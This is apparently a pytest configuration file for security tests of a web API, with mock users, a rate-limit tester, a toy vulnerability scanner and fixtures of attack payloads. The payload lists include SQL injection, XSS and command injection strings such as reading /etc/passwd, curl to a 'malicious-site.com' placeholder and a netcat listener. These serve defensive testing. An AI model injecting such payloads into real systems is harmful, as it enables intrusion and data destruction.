"""
Security Test Configuration

Comprehensive pytest configuration and fixtures for security tests,
including vulnerability scanners, attack simulations, and security assertions.
"""

import pytest
import asyncio
import hashlib
import secrets
import jwt
import time
from typing import Generator, AsyncGenerator, Dict, Any, List, Optional
from unittest.mock import Mock, AsyncMock, patch
from dataclasses import dataclass
import base64
import json
import os
import tempfile
import shutil

# Configure pytest for async tests
pytest_plugins = ["pytest_asyncio"]


@dataclass
class SecurityTestUser:
    """Test user for security scenarios."""
    username: str
    password: str
    role: str
    permissions: List[str]
    api_key: Optional[str] = None
    is_active: bool = True


@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
async def test_db():
    """Create test database for security tests."""
    from tortoise import Tortoise
    
    # Use in-memory SQLite for tests
    await Tortoise.init(
        db_url="sqlite://:memory:",
        modules={"models": ["src.database.models"]}
    )
    await Tortoise.generate_schemas()
    
    yield
    
    await Tortoise.close_connections()


@pytest.fixture
def mock_redis():
    """Mock Redis client for rate limiting tests."""
    with patch("redis.Redis") as mock:
        redis_instance = Mock()
        redis_instance.get = Mock(return_value=None)
        redis_instance.set = Mock(return_value=True)
        redis_instance.incr = Mock(return_value=1)
        redis_instance.expire = Mock(return_value=True)
        mock.return_value = redis_instance
        yield redis_instance


@pytest.fixture
def temp_directory():
    """Create temporary directory for file operation tests."""
    temp_dir = tempfile.mkdtemp()
    yield temp_dir
    shutil.rmtree(temp_dir)


@pytest.fixture
def security_config():
    """Security configuration for tests."""
    return {
        "secret_key": "test-secret-key-for-testing-only",
        "algorithm": "HS256",
        "access_token_expire_minutes": 30,
        "refresh_token_expire_days": 7,
        "bcrypt_rounds": 4,  # Lower for faster tests
        "rate_limit_requests": 60,
        "rate_limit_period": 60,
        "csrf_token_length": 32,
        "session_timeout": 1800,
        "max_login_attempts": 5,
        "lockout_duration": 900
    }


@pytest.fixture
def mock_user():
    """Create mock user for authentication tests."""
    from src.auth.models import User, UserRole
    
    return User(
        id="test-user-123",
        username="testuser",
        email="test@example.com",
        hashed_password="$2b$12$KIXxPfnK6JKxQ1Z3X4X4X4X4X4X4X4X4X4X4X4X4X4X4X4X4X4",
        role=UserRole.USER,
        is_active=True,
        created_at="2024-01-01T00:00:00Z"
    )


@pytest.fixture
def mock_admin_user():
    """Create mock admin user for privilege tests."""
    from src.auth.models import User, UserRole
    
    return User(
        id="admin-user-123",
        username="admin",
        email="admin@example.com",
        hashed_password="$2b$12$ADMINADMINADMINADMINADMINADMINADMINADMINADMINADMIN",
        role=UserRole.ADMIN,
        is_active=True,
        created_at="2024-01-01T00:00:00Z"
    )


@pytest.fixture
def mock_request():
    """Create mock FastAPI request."""
    request = Mock()
    request.client = Mock()
    request.client.host = "127.0.0.1"
    request.headers = {}
    request.cookies = {}
    request.session = {}
    request.method = "GET"
    request.url = Mock()
    request.url.path = "/api/test"
    request.url.scheme = "https"
    request.url.netloc = "example.com"
    return request


@pytest.fixture
def auth_headers(mock_user):
    """Create authentication headers with valid token."""
    from src.auth.tokens import create_access_token
    
    token = create_access_token({"sub": mock_user.username})
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture
async def mock_mcp_server():
    """Mock MCP server for security tests."""
    server = AsyncMock()
    server.execute_command = AsyncMock(return_value={"status": "success"})
    server.validate_input = AsyncMock(return_value=True)
    return server


# Security-specific test fixtures
@pytest.fixture
def security_test_users() -> Dict[str, SecurityTestUser]:
    """Provide different types of users for security testing."""
    return {
        "admin": SecurityTestUser(
            username="admin",
            password="secure_admin_password_123!",
            role="admin",
            permissions=["read", "write", "admin", "delete"],
            api_key="admin-api-key-12345"
        ),
        "user": SecurityTestUser(
            username="regularuser",
            password="user_password_456!",
            role="user",
            permissions=["read"],
            api_key="user-api-key-67890"
        ),
        "malicious": SecurityTestUser(
            username="malicious_user",
            password="malicious_password",
            role="user",
            permissions=["read"],
            api_key="malicious-api-key",
            is_active=False
        )
    }


@pytest.fixture
def sql_injection_payloads():
    """Common SQL injection attack payloads."""
    return [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "' OR 1=1#",
        "' OR 'a'='a",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --"
    ]


@pytest.fixture
def xss_payloads():
    """Common XSS attack payloads."""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>"
    ]


@pytest.fixture
def command_injection_payloads():
    """Common command injection attack payloads."""
    return [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "; curl malicious-site.com",
        "| nc -l 4444"
    ]


@pytest.fixture
def mock_security_scanner():
    """Mock security vulnerability scanner."""
    class SecurityScanner:
        def __init__(self):
            self.vulnerabilities = []
        
        def add_vulnerability(self, vuln_type: str, severity: str, description: str, location: str):
            self.vulnerabilities.append({
                "type": vuln_type,
                "severity": severity,
                "description": description,
                "location": location,
                "timestamp": time.time()
            })
        
        def scan_sql_injection(self, endpoint: str, payload: str) -> bool:
            vulnerable = any(dangerous in payload.lower() for dangerous in ["drop", "union", "select", "--"])
            if vulnerable:
                self.add_vulnerability(
                    "SQL Injection",
                    "HIGH",
                    f"Potential SQL injection in endpoint {endpoint}",
                    endpoint
                )
            return vulnerable
        
        def get_report(self) -> Dict[str, Any]:
            return {
                "total_vulnerabilities": len(self.vulnerabilities),
                "vulnerabilities": self.vulnerabilities,
                "severity_breakdown": {
                    "HIGH": len([v for v in self.vulnerabilities if v["severity"] == "HIGH"]),
                    "MEDIUM": len([v for v in self.vulnerabilities if v["severity"] == "MEDIUM"]),
                    "LOW": len([v for v in self.vulnerabilities if v["severity"] == "LOW"])
                }
            }
    
    return SecurityScanner()


@pytest.fixture
def rate_limit_tester():
    """Utility for testing rate limiting."""
    class RateLimitTester:
        def __init__(self):
            self.requests = []
        
        async def test_rate_limit(self, endpoint_func, requests_per_second: int, duration: int = 10):
            import asyncio
            
            async def make_request():
                start_time = time.time()
                try:
                    result = await endpoint_func()
                    end_time = time.time()
                    self.requests.append({
                        "timestamp": start_time,
                        "duration": end_time - start_time,
                        "status": "success",
                        "result": result
                    })
                    return result
                except Exception as e:
                    end_time = time.time()
                    self.requests.append({
                        "timestamp": start_time,
                        "duration": end_time - start_time,
                        "status": "error",
                        "error": str(e)
                    })
                    raise
            
            tasks = []
            for i in range(requests_per_second * duration):
                tasks.append(make_request())
                if (i + 1) % requests_per_second == 0:
                    await asyncio.sleep(1)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            return {
                "total_requests": len(results),
                "successful_requests": len([r for r in results if not isinstance(r, Exception)]),
                "failed_requests": len([r for r in results if isinstance(r, Exception)]),
                "rate_limited": len([r for r in results if isinstance(r, Exception) and "rate limit" in str(r).lower()]),
                "requests": self.requests
            }
    
    return RateLimitTester()


@pytest.fixture
def crypto_test_utils():
    """Cryptographic utilities for security testing."""
    class CryptoTestUtils:
        @staticmethod
        def generate_weak_password() -> str:
            return "123456"
        
        @staticmethod
        def generate_strong_password() -> str:
            return secrets.token_urlsafe(32)
        
        @staticmethod
        def hash_password(password: str, weak: bool = False) -> str:
            if weak:
                return hashlib.md5(password.encode()).hexdigest()
            else:
                # Simulate bcrypt
                return f"$2b$12${secrets.token_urlsafe(53)}"
        
        @staticmethod
        def generate_api_key() -> str:
            return secrets.token_urlsafe(32)
        
        @staticmethod
        def create_malformed_jwt() -> str:
            return "invalid.jwt.token"
    
    return CryptoTestUtils()


# Test environment variables
os.environ["TESTING"] = "true"
os.environ["SECRET_KEY"] = "test-secret-key"
os.environ["DATABASE_URL"] = "sqlite://:memory:"
os.environ["REDIS_URL"] = "redis://localhost:6379/0"